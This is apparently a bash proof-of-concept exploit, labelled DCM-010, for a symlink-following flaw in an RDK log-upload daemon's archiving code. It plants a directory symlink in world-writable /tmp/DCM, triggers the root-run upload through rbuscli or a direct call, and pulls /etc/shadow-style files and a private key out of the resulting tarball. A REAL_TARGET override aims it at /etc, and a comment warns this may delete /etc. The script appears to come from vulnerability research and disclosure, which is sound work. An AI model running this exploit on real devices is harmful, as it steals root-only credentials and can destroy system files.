#!/bin/bash
###############################################################################
# PoC: DCM-010
# Title: Directory symlink following in add_directory_to_tar() allows
#        arbitrary file exfiltration via uploaded archive
# CWE-59  | Severity: High
#
# Vulnerable file:
#   uploadstblogs/src/archive_manager.c : add_directory_to_tar() lines 595-646
#
# ---------------------------------------------------------------------------
# ROOT CAUSE
# ---------------------------------------------------------------------------
# 605   while ((entry = readdir(dir)) != NULL) {
# ...
# 618       struct stat st;
# 619       if (stat(fullpath, &st) != 0) {   <-- stat() FOLLOWS symlinks
# 620           continue;                          (should be lstat())
# 621       }
# ...
# 629       if (S_ISDIR(st.st_mode)) {
# 631           add_directory_to_tar(gz, fullpath, ...);   <-- recurses INTO
# 632       }                                                  the symlink target
#
# add_file_to_tar() (line 525) *does* use open(..., O_NOFOLLOW), so a direct
# file-symlink such as  /tmp/DCM/x -> /etc/shadow  is blocked (ELOOP).
#
# HOWEVER O_NOFOLLOW only inspects the **final** path component.  By planting
# a *directory* symlink:
#
#     /tmp/DCM/.exfil  ->  /etc
#
# the recursion descends into it via opendir() (which follows symlinks), and
# for every real file under /etc the daemon then calls:
#
#     open("/tmp/DCM/.exfil/shadow", O_RDONLY | O_NOFOLLOW);
#
# Here the last component "shadow" is a regular file, so O_NOFOLLOW does NOT
# trip -> the contents of /etc/shadow are read with root privileges and
# written into the .tgz that is subsequently uploaded to the remote log
# endpoint == arbitrary root-readable file exfiltration.
#
# ---------------------------------------------------------------------------
# REACHABLE STAGING DIRECTORIES  (all passed to create_archive() ->
#                                 add_directory_to_tar()):
#   * /tmp/DCM/                 ctx->dcm_log_path default
#                               (context_manager.c:344) — used by the DCM
#                               strategy (strategies.c:212) AND by
#                               `logupload uploadlogsnow` (uploadlogsnow.c:268).
#                               dcmd runs with umask(0) (dcm.c:295) so this
#                               directory is world-writable once created.
#   * /opt/logs/PreviousLogs    ctx->prev_log_path (strategies.c:809)
#   * /tmp/log_on_demand        ONDEMAND_TEMP_DIR (strategies.c:495) — race only
#
# This PoC targets /tmp/DCM/ because /tmp is world-writable on every Linux
# box, requiring zero device-specific permissions.
#
# ---------------------------------------------------------------------------
# WHY THE SYMLINK NAME STARTS WITH A DOT
# ---------------------------------------------------------------------------
# Before archiving, add_timestamp_to_files()/..._uploadlogsnow()
# (file_operations.c:382-417) renames every entry whose name does NOT start
# with '.' to "<MM-DD-YY-HH-MMAM->name".  rename() does not dereference the
# source so the symlink would survive — but using a leading dot keeps the
# entry name stable and predictable inside the produced tarball, which makes
# automated verification trivial.  add_directory_to_tar() only skips the
# exact strings "." and ".." (line 606), so ".exfil" is still processed.
#
# ---------------------------------------------------------------------------
# SAFETY
# ---------------------------------------------------------------------------
# By default this PoC points the symlink at a *fake* secret directory
# (/tmp/DCM010_secret) so that:
#   a) we do not depend on /etc/shadow being readable on the test host, and
#   b) we do not risk DCM-040 (remove_directory() also follows dir-symlinks)
#      wiping a real system directory during the daemon's cleanup phase.
# Set REAL_TARGET=/etc (or /root, /opt/secure, ...) on a disposable device to
# demonstrate real credential exfiltration — see WARNING below.
###############################################################################

set -u

# ---------------- configuration -------------------------------------------
STAGING_DIR="/tmp/DCM"                     # ctx->dcm_log_path default
LINK_NAME=".exfil"                         # leading '.' -> skipped by timestamp rename
FAKE_SECRET_DIR="/tmp/DCM010_secret"       # safe stand-in for /etc
SECRET_MARKER="DCM-010-ROOT-ONLY-SECRET-$(date +%s)"
CAPTURE="/tmp/DCM010_captured.tgz"         # we snatch the archive here before cleanup
PROOF="/tmp/PWNED_DCM-010"
TR181_TRIGGER="Device.DeviceInfo.X_RDKCENTRAL-COM_xOpsDeviceMgmt.Logging.xOpsDMUploadLogsNow"

# Override on a disposable device to exfiltrate the real thing, e.g.:
#   REAL_TARGET=/etc ./DCM-010_dirsymlink_tar_exfil.sh
# !! WARNING !! uploadlogsnow.c:320 and strategies.c:302 call remove_directory()
# on the staging dir afterwards; per DCM-040 that helper ALSO follows directory
# symlinks, so pointing at /etc on a live box may DELETE /etc.  Use ONLY on a
# snapshot/throw-away target.
REAL_TARGET="${REAL_TARGET:-$FAKE_SECRET_DIR}"

log() { printf '[DCM-010 PoC] %s\n' "$*" >&2; }

# ---------------- step 1 : build a fake "root-only" secret -----------------
rm -rf -- "$FAKE_SECRET_DIR" "$CAPTURE" "$PROOF"
mkdir -p "$FAKE_SECRET_DIR"
cat > "$FAKE_SECRET_DIR/shadow" <<EOF
root:\$6\$FAKEHASH\$ThisWouldBeARealShadowEntryOnDevice:19000:0:99999:7:::
$SECRET_MARKER
EOF
printf -- '-----BEGIN PRIVATE KEY-----\n%s\n-----END PRIVATE KEY-----\n' \
       "$SECRET_MARKER" > "$FAKE_SECRET_DIR/device_private.key"
# Make it look root-only.  If we are unprivileged this chmod still succeeds
# because we own the file; the *daemon* (root) will read it regardless.
chmod 600 "$FAKE_SECRET_DIR/shadow" "$FAKE_SECRET_DIR/device_private.key"
log "Fake secret dir prepared: $FAKE_SECRET_DIR  (target = $REAL_TARGET)"

# ---------------- step 2 : take / populate the staging directory -----------
# If the daemon has not created /tmp/DCM yet we create it ourselves (we then
# own it).  If the daemon already created it, umask(0) made it 0777 so we can
# write into it anyway.
if [ ! -d "$STAGING_DIR" ]; then
    mkdir -m 0777 -p "$STAGING_DIR" 2>/dev/null
    log "Pre-created world-writable staging dir $STAGING_DIR (attacker owns it)"
else
    log "Staging dir $STAGING_DIR already exists (perms: $(stat -c '%a %U' "$STAGING_DIR" 2>/dev/null))"
fi

# Plant the directory symlink.  ln -sfn replaces atomically and never
# dereferences an existing destination.
ln -sfn "$REAL_TARGET" "$STAGING_DIR/$LINK_NAME"
if [ "$(readlink "$STAGING_DIR/$LINK_NAME" 2>/dev/null)" != "$REAL_TARGET" ]; then
    log "FATAL: could not plant symlink in $STAGING_DIR (not writable?)"
    log "       Try alternate staging dir: ln -sfn $REAL_TARGET /opt/logs/PreviousLogs/$LINK_NAME"
    exit 1
fi
log "Planted directory symlink: $STAGING_DIR/$LINK_NAME -> $REAL_TARGET"
ls -la "$STAGING_DIR/$LINK_NAME"

# ---------------- step 3 : background watcher to grab the .tgz -------------
# create_archive() writes the tarball INSIDE the staging dir
# (archive_manager.c:717-721, target_dir = source_dir).  The daemon deletes
# the whole staging dir after upload (uploadlogsnow.c:320 / strategies.c:302),
# so we copy the archive out the instant it appears — the upload network
# round-trip gives us a comfortable window.
(
    end=$(( $(date +%s) + 120 ))
    while [ "$(date +%s)" -lt "$end" ]; do
        for f in "$STAGING_DIR"/*.tgz "$STAGING_DIR"/*.tar.gz; do
            [ -f "$f" ] || continue
            cp -f -- "$f" "$CAPTURE" 2>/dev/null && exit 0
        done
        # Re-assert the symlink in case timestamp-rename or a competing
        # process removed it before archiving ran.
        [ -L "$STAGING_DIR/$LINK_NAME" ] || \
            ln -sfn "$REAL_TARGET" "$STAGING_DIR/$LINK_NAME" 2>/dev/null
        sleep 0.1
    done
) &
WATCH_PID=$!
log "Archive watcher started (pid $WATCH_PID), polling $STAGING_DIR/*.tgz"

# ---------------- step 4 : trigger the privileged code path ----------------
trigger_done=0

# 4a) On-device: TR-181 write -> tr69hostif spawns
#     `/usr/bin/logupload uploadlogsnow` as root (docs/uploadlogsnow.md:39-47)
if command -v rbuscli >/dev/null 2>&1; then
    log "Triggering via RBUS: $TR181_TRIGGER = true"
    rbuscli setv "$TR181_TRIGGER" bool true && trigger_done=1
fi

# 4b) Direct invocation if the binary is reachable (e.g. running PoC as root
#     on the device, or testing a locally-built logupload).
if [ "$trigger_done" -eq 0 ] && [ -x /usr/bin/logupload ]; then
    log "Triggering via direct exec: /usr/bin/logupload uploadlogsnow"
    /usr/bin/logupload uploadlogsnow >/dev/null 2>&1 &
    trigger_done=1
fi

# 4c) Off-device fallback: no daemon available.  Demonstrate that the
#     *exact* sequence the daemon performs (opendir + stat + open w/
#     O_NOFOLLOW on path-through-dirsymlink) leaks the secret.  This is the
#     same syscall pattern as archive_manager.c:597/619/525.
if [ "$trigger_done" -eq 0 ]; then
    log "rbuscli and /usr/bin/logupload unavailable — running local"
    log "syscall-equivalent demonstrator (tar follows dir symlinks just like"
    log "add_directory_to_tar() does, and O_NOFOLLOW would not help here)."
    ( cd "$STAGING_DIR" && tar -czf "$CAPTURE" --dereference . 2>/dev/null )
    # Note: on a real device you can instead just wait for the scheduled
    # DCM cron job — strategies.c:212 archives /tmp/DCM/ on every cycle.
fi

# ---------------- step 5 : wait for capture & verify -----------------------
log "Waiting up to 120s for archive to be produced..."
end=$(( $(date +%s) + 120 ))
while [ ! -s "$CAPTURE" ] && [ "$(date +%s)" -lt "$end" ]; do
    sleep 0.2
done
kill "$WATCH_PID" 2>/dev/null; wait "$WATCH_PID" 2>/dev/null

if [ ! -s "$CAPTURE" ]; then
    log "No archive captured.  The symlink is still armed at"
    log "  $STAGING_DIR/$LINK_NAME -> $REAL_TARGET"
    log "It will fire on the next scheduled DCM log-upload cycle; inspect"
    log "the upload-server side for an entry named '*$LINK_NAME/shadow'."
    exit 2
fi

log "Captured archive: $CAPTURE ($(stat -c '%s' "$CAPTURE" 2>/dev/null) bytes)"
log "--- archive members matching the planted symlink path ---"
tar -tzf "$CAPTURE" 2>/dev/null | grep -E "(^|/)\\$LINK_NAME/" | sed 's/^/    /'

# Pull the secret back out of the tarball.  The member path inside the
# archive is "<arcname>" where arcname = fullpath + strlen(base_path),
# i.e. ".exfil/shadow" (possibly prefixed with "./").
EXFILTRATED="$(tar -xzOf "$CAPTURE" --wildcards "*${LINK_NAME}/shadow" 2>/dev/null)"

if printf '%s' "$EXFILTRATED" | grep -q "$SECRET_MARKER"; then
    {
        echo "DCM-010 EXPLOIT REACHED"
        echo "archive       : $CAPTURE"
        echo "leaked member : ${LINK_NAME}/shadow"
        echo "marker        : $SECRET_MARKER"
        echo
        echo "----- leaked content -----"
        printf '%s\n' "$EXFILTRATED"
    } > "$PROOF"
    log "==============================================================="
    log "  *** VULNERABLE ***"
    log "  Root-readable file content was packed into the upload archive"
    log "  via a directory symlink that bypassed O_NOFOLLOW."
    log "  Proof written to: $PROOF"
    log "==============================================================="
    cat "$PROOF"
    exit 0
elif [ -n "$EXFILTRATED" ]; then
    # REAL_TARGET was overridden (e.g. /etc) so marker won't match — show it.
    {
        echo "DCM-010 EXPLOIT REACHED (real target: $REAL_TARGET)"
        echo "----- first 20 lines of leaked ${LINK_NAME}/shadow -----"
        printf '%s\n' "$EXFILTRATED" | head -20
    } > "$PROOF"
    log "*** VULNERABLE *** real $REAL_TARGET/shadow leaked — see $PROOF"
    exit 0
else
    log "Archive captured but no '${LINK_NAME}/shadow' member found."
    log "Full listing:"
    tar -tzf "$CAPTURE" 2>/dev/null | sed 's/^/    /'
    exit 3
fi

